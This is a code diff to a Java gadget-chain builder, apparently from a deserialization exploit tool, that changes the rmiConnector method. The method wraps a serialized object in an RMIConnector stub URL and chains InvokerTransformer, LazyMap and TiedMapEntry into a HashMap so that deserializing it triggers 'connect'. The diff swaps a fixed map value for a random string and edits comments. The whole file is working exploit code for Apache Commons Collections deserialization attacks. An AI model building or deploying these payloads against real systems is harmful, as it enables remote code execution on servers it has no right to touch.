@@ -3,6 +3,7 @@ package com.ppp.chain;
 import com.ppp.Printer;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.EnchantEnums;
+import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.Reflections;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
@@ -57,24 +58,29 @@ public class WrapSerialization {
 
     /**
      * 任意方法调用 connect
-     * cc 载体
+     * 需要任意方法调用
      *
      * @param object
      * @return
      * @throws Exception
      */
     public static Object rmiConnector(Object object) throws Exception {
+        String s = RanDomUtils.generateRandomString(1);
+
         JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
         Reflections.setFieldValue(jmxServiceURL, "urlPath", "/stub/" + object);
         RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
 
+        /**
+         * 以下为任意方法调用
+         */
         InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
         HashMap map = new HashMap();
         Map<Object, Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
         TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);
 
         HashMap hashMap = new HashMap();
-        hashMap.put(tiedMapEntry, "xxx");
+        hashMap.put(tiedMapEntry, s);
         lazyMap.remove(rmiConnector);
 
         Reflections.setFieldValue(lazyMap, "factory", invokerTransformer);
